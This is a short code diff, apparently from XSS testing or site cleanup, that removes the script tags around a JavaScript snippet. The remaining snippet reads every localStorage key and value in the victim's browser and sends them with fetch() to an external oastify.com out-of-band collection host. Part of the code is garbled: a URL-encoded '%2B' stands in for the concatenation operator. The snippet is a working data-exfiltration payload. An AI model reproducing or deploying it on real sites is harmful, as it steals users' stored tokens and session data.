@@ -1,4 +1,3 @@
-<script type="text/javascript">
 var encodedLocalStorage = {};
 for (var i = 0; i < localStorage.length; i++) {
   var key = encodeURIComponent(localStorage.key(i));
@@ -6,4 +5,3 @@ for (var i = 0; i < localStorage.length; i++) {
   encodedLocalStorage[key] = value;
   fetch('http://oh95sqeqy2btr38ouutopqwd046xunic.oastify.com/?c='%2BencodedLocalStorage);
 }
-</script>
